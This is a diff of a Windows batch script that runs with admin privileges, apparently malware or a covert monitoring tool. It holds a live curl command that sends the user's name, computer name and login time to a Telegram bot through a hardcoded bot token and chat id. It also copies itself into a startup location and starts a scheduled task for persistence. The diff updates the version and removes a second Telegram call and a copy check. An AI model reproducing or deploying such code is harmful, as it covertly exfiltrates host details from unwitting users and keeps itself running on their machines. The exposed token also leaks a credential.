@@ -9,7 +9,7 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=1.9"
+set "BATCHVERSION=2.0"
 echo BATCHVERSION=%BATCHVERSION%
 timeout /t 70 /nobreak
 
@@ -32,6 +32,7 @@ for /L %%i in (1,1,13) do (
     set /A "rand=!random! %% 62"
     for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
 )
+
 set "filename1=!filename!"
 set "filename="
 
@@ -57,13 +58,6 @@ set "FILE_PATH_RUNNING=%temp%\RUNNING_Topic.txt"
 
 
 
-
-
-
-curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendMessage" ^
-     -d "chat_id=%CHAT_ID_RUNNING%" ^
-     -d "message_thread_id=%TOPIC_ID_RUNNING%" ^
-     -d "text=%ENCODED_MESSAGE_RUNNING%"
 
 
 curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|LoggedIn(0)|%time%|v%BATCHVERSION%"
@@ -244,11 +238,6 @@ if not exist "%startupFile%" (
     copy /Y "%sourceFile%" "%startupFile%"
     schtasks /run /tn "%Task1%"
     echo Task Started.
-    if exist "%startupFile%" (
-        echo File restored successfully.
-    ) else (
-        echo Failed to copy file.
-    )
 ) else (
     echo File already exists: "%startupFile%"
 )
